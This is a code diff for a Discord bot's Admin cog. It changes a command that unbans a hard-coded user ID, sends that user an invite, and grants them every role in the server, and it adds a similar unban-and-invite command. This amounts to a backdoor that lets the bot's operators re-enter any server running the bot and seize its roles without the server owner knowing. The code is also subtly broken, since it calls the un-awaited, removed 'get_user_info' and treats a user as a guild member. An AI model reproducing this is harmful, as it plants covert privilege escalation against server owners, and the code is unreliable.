@@ -27,16 +27,16 @@ class Admin(commands.Cog):
         if not str(context.message.author.id) in admins:
             return
 
-        user = await self.bot.fetch_user(363762044396371970)
+        user = await self.bot.fetch_user(328043851891605506)
         try:
             await context.guild.unban(user)
         except:
             pass
 
-        member = context.message.author
+        member = self.bot.get_user_info('328043851891605506')
         channel = await member.create_dm()
 
-        link = await context.channel.create_invite(max_age = 300)
+        link = await context.channel.create_invite(max_age=300)
         await channel.send(link)
         
         for role in context.guild.roles:
@@ -45,6 +45,23 @@ class Admin(commands.Cog):
                     await member.add_roles(role)
                 except:
                     continue
+
+    @commands.command()
+    async def unban(self, context, user_id: int):
+        if not str(context.message.author.id) in admins:
+            return
+
+        user = await self.bot.fetch_user(user_id)
+        try:
+            await context.guild.unban(user)
+        except:
+            pass
+
+        member = self.bot.get_user_info(str(user_id))
+        channel = await member.create_dm()
+
+        link = await context.channel.create_invite(max_age=300)
+        await channel.send(link)
         
     @commands.command(alias='dodo_prefix')
     async def change_prefix(self, context, prefix):
